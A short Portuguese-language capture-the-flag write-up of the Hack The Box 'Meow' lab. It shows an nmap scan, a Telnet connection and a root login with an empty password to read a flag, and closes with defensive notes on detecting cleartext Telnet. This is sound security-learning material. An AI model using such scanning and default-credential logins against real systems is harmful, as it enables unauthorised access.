# 01 - (Very Easy) - (Purple) - Meow

## Title: "Meow" | Difficulty: "Very Easy"

### Track: "Network" | Team focus: "Purple (ataca p/ aprender, detecta p/ alertar)"

#### Tags: ["telnet", "enum", "default-credentials"]

#### Date: 2026-06-27

#### Status: "complete"

#### HTB link: https://app.hackthebox.com/machines/Meow


# Hack The Box - Meow

## O que é

Meow é o primeiro desafio prático do Hack The Box, bem básico mesmo. A ideia é só aprender o bizu de escanear uma máquina, encontrar um serviço rodando e explorar.

## Como eu resolvi

### 1. Escaneamento com nmap

Primeiro a gente precisa descobrir o que tá rodando na máquina:

```bash
nmap -sV <IP>
```

Resultado:

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

Achei o Telnet rodando na porta 23. Fácil demais.

### 2. Conexão via Telnet

Agora é só conectar:

```bash
telnet <IP>
```

Aí pediu login. Testei `root` e deixei a senha em branco (só pressionei Enter). Boom, tava dentro.

```bash
root@meow:~#
```

### 3. Achando a flag

Listei os arquivos:

```bash
ls
```

Tinha um arquivo chamado `flag.txt`. Leitura rápida:

```bash
cat flag.txt
```

## O resultado

`flag.txt` lido com sucesso (valor omitido — sem vazamento de flags).

---

**Aprendizado:** Telnet é inseguro demais, transmite tudo em texto plano e ainda permite senha vazia. Moral da história: sempre usar SSH e colocar uma senha forte nas coisas.

**Olhar Blue:** telnet na rede = credencial visível em PCAP (`tcp.port == 23`), login `root` sem senha = anomalia de autenticação. Num SIEM, telnet exposto vira alerta de `cleartext protocol` — mesmo padrão que meu honeypot captura em `ssh.log`.
